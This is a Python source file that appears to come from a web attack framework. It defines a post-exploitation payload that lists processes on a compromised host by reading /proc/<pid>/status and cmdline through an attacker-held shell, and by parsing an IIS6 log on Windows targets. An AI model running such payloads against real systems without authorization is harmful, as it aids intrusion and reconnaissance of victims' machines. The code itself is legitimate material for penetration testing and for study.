import re
from core.controllers.threads.threadManager import threadManagerObj as tm
from plugins.attack.payloads.base_payload import base_payload
import core.controllers.outputManager as om
import core.data.kb.knowledgeBase as kb
#TODO: Not working?


class list_processes(base_payload ):
    '''
    This payload shows current proccesses on the system.
    '''
    def parse_proc_name( self, status_file ):
        name = re.search('(?<=Name:\t)(.*)', status_file)
        if name:
            return name.group(1)
        else:
            return ''

    def parse_proc_state( self, status_file ):
        state = re.search('(?<=State:\t)(.*)', status_file)
        if state:
            return state.group(1)
        else:
            return ''
    
    def _thread_read( self, pid):
        #   "progress bar"  
        self.k -= 1
        if self.k == 0:
            om.out.console('.', newLine=False)
            self.k=400
        #   end "progress bar"

        status_file = self.shell.read('/proc/'+str(pid)+'/status')
        cmd = ''
        if status_file:
            name = self.parse_proc_name(status_file)
            state = self.parse_proc_state(status_file)
            cmd = self.shell.read('/proc/'+str(pid)+'/cmdline')
            if not cmd:
                cmd = '[kernel process]'
            cmd = cmd.replace('\x00',' ')
            self.result[pid] = {'name':name, 'state':state, 'cmd':cmd}
            om.out.console('+', newLine=False)
            #TODO: Check how to append to the KB
        #if kb.kb:
            #kb.kb.append(str(i), [str(i), name, state, cmd])

    def api_read(self):
        self.result = {}
        self.k = 400
        
        max_pid = self.shell.read('/proc/sys/kernel/pid_max')[:-1]
        #   Remove comment to debug
        #max_pid = 400
        
        for pid in xrange(1, int(max_pid)):
            targs = (pid, )
            tm.startFunction( target=self._thread_read, args=targs, ownerObj=self )
        tm.join( self )
        
        return self.result
    
    def api_win_read(self):
        self.result = {}
        
        def parse_iis6_log(iis6_log):
            process_list = re.findall('(?<=OC_ABOUT_TO_COMMIT_QUEUE:[)(.*)', iis6_log, re.MULTILINE)
            for process in process_list:
                pid, name = process.split('] ')
                self.result[ pid ] = {'name':name, 'state':'unknown', 'cmd':'unknown'}
        
        parse_iis6_log(self.shell.read('/windows/iis6.log'))
        return self.result
        
    def run_read(self):
        process_dict= self.api_read()
        result = []
        
        if process_dict:
            sorted_process_ids = sorted(process_dict)
            result.append('PID'.ljust(7)+'NAME'.ljust(20)+'STATUS'.ljust(20)+'CMD'.ljust(30))
            
            for pid in sorted_process_ids:
                pid_info = process_dict[pid]
                msg = str(pid).ljust(7) + pid_info['name'].ljust(20)
                msg += pid_info['state'].ljust(20) + pid_info['cmd'].ljust(30)
                result.append( msg )
            om.out.console('')
            
        if result == [ ]:
            result.append('Cant list proccesses.')
        return result
